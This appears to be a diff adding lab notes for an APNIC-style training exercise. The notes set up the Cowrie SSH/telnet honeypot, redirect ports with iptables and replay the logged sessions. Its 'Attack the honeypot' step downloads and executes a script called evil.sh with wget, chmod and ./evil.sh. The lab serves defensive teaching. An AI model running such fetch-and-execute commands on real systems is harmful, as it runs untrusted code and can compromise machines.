@@ -1,0 +1,98 @@
+https://github.com/cowrie/cowrie
+
+ssh apnic@192.168.30.1
+sudo apt-get update
+sudo apt-get install -y git iptables virtualenv python3-virtualenv libssl-dev libffi-dev build-essential libpython3-dev python3-minimal authbind
+
+#change the default ssh port of the server to something non-standard
+sudo sed -i 's/\#Port 22/Port 2200/' /etc/ssh/sshd_config
+grep -in "Port 22" /etc/ssh/sshd_config
+sudo systemctl restart sshd.service
+sudo systemctl status sshd.service
+
+#reconnect using the newly configured port 
+ssh apnic@192.168.30.1 -p 2200
+
+#Create a port forwarding rule to forward anything over standard ssh (22) and telnet (23) to Cowrie:
+sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
+sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2223
+sudo iptables -t nat -L -n -v
+
+#create a cowrie acc with no pwd
+sudo adduser --disabled-password cowrie
+
+#Install and configure 
+sudo su - cowrie
+git clone http://github.com/cowrie/cowrie
+cd cowrie
+virtualenv --python=python3 cowrie-env
+source cowrie-env/bin/activate
+pip install --upgrade pip
+pip install --upgrade -r requirements.txt
+
+#set telnet to TRUE
+sed -i '/\[telnet\]/, +3 s/false/true/' etc/cowrie.cfg.dist
+grep -in -A 3 "\[telnet" etc/cowrie.cfg.dist
+
+#Start cowrie
+bin/cowrie start
+ss -nat
+
+
+#Attack the honeypot 
+ssh root@192.168.30.1 -o UserKnownHostsFile=/dev/null
+
+#To download the script:
+wget https://wiki.apnictraining.net/_media/evil.sh
+cat evil.sh
+chmod +x evil.sh
+./evil.sh
+
+#Playback the attack
+#verify working directory as /home/cowrie/cowrie
+pwd
+#access the logs
+less var/log/cowrie/cowrie.log
+ls var/lib/cowrie/tty/
+
+#replay the logs
+bin/playlog var/lib/cowrie/tty/*
+bin/playlog var/lib/cowrie/tty/fcf3004d8fc51aa573fbfc6dd375aa981087a38b2aa9b056c1b228dce8eb8a2f
+
+
+cd /home/cowrie/cowrie/var/lib/cowrie
+wget https://raw.githubusercontent.com/cowrie/cowrie/master/src/cowrie/scripts/playlog.py
+chmod +x playlog.py
+./playlog.py tty/*
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
